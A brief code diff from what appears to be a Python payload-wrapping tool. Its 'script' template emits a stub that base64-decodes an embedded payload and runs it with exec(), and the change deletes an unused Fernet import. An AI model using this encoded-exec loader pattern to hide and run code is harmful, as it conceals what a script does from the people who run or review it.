@@ -41,7 +41,7 @@ elif choice == "script":
     text = f'''
 #!/bin/python3.9
 import base64
-from cryptography.fernet import Fernet
+
 payload = {payload_encoded}
 payload_decoded = base64.b64decode(payload)
 exec(payload_decoded)
